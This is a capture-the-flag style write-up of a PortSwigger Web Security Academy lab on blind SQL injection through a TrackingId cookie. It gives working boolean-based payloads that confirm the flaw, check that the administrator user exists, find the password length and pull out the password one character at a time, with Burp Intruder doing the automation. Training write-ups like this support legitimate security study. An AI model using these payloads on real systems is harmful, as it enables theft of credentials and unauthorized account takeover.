# Blind SQL Injection - Conditional Responses

## Lab

PortSwigger Web Security Academy

Difficulty: Practitioner

---

## Objective

Exploit a Blind SQL Injection vulnerability present in the TrackingId cookie to retrieve the administrator password and authenticate successfully.

---

## Vulnerability

The application performs a SQL query using the TrackingId cookie.

Example:

```sql
SELECT TrackingId
FROM TrackedUsers
WHERE TrackingId='TrackingId'
```

The query results are not displayed.

Instead, the application returns a **"Welcome back"** message whenever the injected SQL condition evaluates to TRUE.

---

## Methodology

### Step 1

Verify SQL Injection

TRUE condition

```sql
' AND '1'='1
```

FALSE condition

```sql
' AND '1'='2
```

The application's response changed depending on the boolean condition, confirming Blind SQL Injection.

---

### Step 2

Confirm the administrator user exists

```sql
' AND
(
SELECT 'Yes'
FROM users
WHERE username='administrator'
)='Yes'--
```

---

### Step 3

Determine password length

```sql
' AND
(
SELECT 'Yes'
FROM users
WHERE username='administrator'
AND LENGTH(password)>15
)='Yes'--
```

Burp Intruder (Sniper) was used to automate testing until the password length was identified.

---

### Step 4

Extract password characters

```sql
' AND
(
SELECT 'Yes'
FROM users
WHERE username='administrator'
AND SUBSTRING(password,1,1)='a'
)='Yes'--
```

Burp Intruder was configured to iterate through character positions and alphanumeric values to recover the administrator password.

---

### Step 5

Authenticate as administrator

The recovered password was used to successfully log into the administrator account.

---

## Tools Used

- Burp Suite Professional
- Burp Repeater
- Burp Intruder
- Firefox
- PortSwigger Web Security Academy

---

## Skills Practiced

- Blind SQL Injection
- Boolean-based SQL Injection
- SQL Payload Construction
- Burp Repeater
- Burp Intruder
- Response Analysis
- Password Enumeration
- Authentication Bypass

---

## Screenshots

- Boolean Condition Verification
- Password Length Enumeration
- Intruder Attack
- Password Extraction
- Administrator Login
- Lab Solved
